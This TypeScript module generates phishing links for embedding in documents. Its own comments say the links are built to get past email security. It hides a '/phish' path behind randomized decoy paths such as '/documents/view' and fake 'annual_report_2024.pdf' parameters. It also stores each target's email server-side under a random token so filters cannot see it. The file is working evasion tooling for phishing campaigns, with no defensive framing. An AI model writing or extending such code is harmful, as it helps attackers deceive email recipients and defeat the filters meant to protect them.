/**
 * Generate document-safe links that pass email security
 * Uses multiple obfuscation layers
 */

import crypto from 'crypto'

export type DocumentType = 'pdf' | 'docx' | 'xlsx' | 'svg' | 'html'

export interface DocumentLinkConfig {
  baseUrl: string
  email: string
  documentType: DocumentType
  useObfuscation: boolean
}

/**
 * Generate a safe link for embedding in documents
 */
export function generateDocumentSafeLink(
  config: DocumentLinkConfig
): string {
  const { baseUrl, email, documentType, useObfuscation } = config

  if (!useObfuscation) {
    // Simple link (risky)
    return `${baseUrl}/?token=${generateToken()}&email=${encodeURIComponent(
      email
    )}`
  }

  // === ADVANCED OBFUSCATION ===

  // Strategy 1: Use legitimate-looking domain redirect
  // Instead of: https://yoursite.com/phish
  // Use: https://yoursite.com/documents/view/annual-report-2024
  const legitimatePath = getLegitimateDocumentPath()

  // Strategy 2: No email in URL (use session-based lookup)
  // Generate one-time token that maps to email server-side
  const sessionToken = generateSessionToken(email)

  // Strategy 3: Add legitimate-looking parameters
  const legitimateParams = {
    doc: 'annual_report_2024.pdf',
    ref: 'email',
    view: 'preview',
    lang: 'en',
    t: Date.now().toString(36),
  }

  // Build URL
  const url = new URL(legitimatePath, baseUrl)
  url.searchParams.set('id', sessionToken)
  Object.entries(legitimateParams).forEach(([key, value]) => {
    url.searchParams.set(key, value)
  })

  return url.toString()
}

/**
 * Generate legitimate-looking document paths
 */
function getLegitimateDocumentPath(): string {
  const paths = [
    '/documents/view',
    '/files/download',
    '/reports/annual',
    '/shared/preview',
    '/portal/documents',
    '/secure/files',
    '/assets/documents',
    '/resources/download',
  ]

  return paths[Math.floor(Math.random() * paths.length)]
}

/**
 * Generate session token (server-side email mapping)
 */
function generateSessionToken(email: string): string {
  // This token is stored server-side and maps to email
  // Email security can't extract the email from URL
  const token = crypto.randomUUID()

  // Store mapping (async, fire and forget)
  storeSessionMapping(token, email).catch(() => {
    // Silent fail
  })

  return token
}

/**
 * Generate simple token (fallback)
 */
function generateToken(): string {
  return crypto.randomBytes(32).toString('base64url')
}

/**
 * Store session mapping for later retrieval
 */
export async function storeSessionMapping(
  token: string,
  email: string
): Promise<void> {
  // Store in database, Redis, or file system
  const fs = await import('fs').then((m) => m.promises)
  const path = await import('path')

  const mappingPath = path.join(process.cwd(), '.session-mappings.json')

  let mappings: Record<string, { email: string; created: number }> = {}
  try {
    const content = await fs.readFile(mappingPath, 'utf-8')
    mappings = JSON.parse(content)
  } catch {
    // File doesn't exist yet
  }

  mappings[token] = {
    email,
    created: Date.now(),
  }

  // Clean up old mappings (> 7 days)
  const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000
  Object.keys(mappings).forEach((key) => {
    if (mappings[key].created < sevenDaysAgo) {
      delete mappings[key]
    }
  })

  await fs.writeFile(mappingPath, JSON.stringify(mappings, null, 2))
}

/**
 * Retrieve email from session token
 */
export async function getEmailFromSessionToken(
  token: string
): Promise<string | null> {
  const fs = await import('fs').then((m) => m.promises)
  const path = await import('path')

  try {
    const mappingPath = path.join(process.cwd(), '.session-mappings.json')
    const content = await fs.readFile(mappingPath, 'utf-8')
    const mappings = JSON.parse(content)

    const mapping = mappings[token]
    if (!mapping) {
      return null
    }

    // Check if expired (> 7 days)
    const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000
    if (mapping.created < sevenDaysAgo) {
      // Clean up expired mapping
      delete mappings[token]
      await fs.writeFile(mappingPath, JSON.stringify(mappings, null, 2))
      return null
    }

    return mapping.email
  } catch {
    return null
  }
}




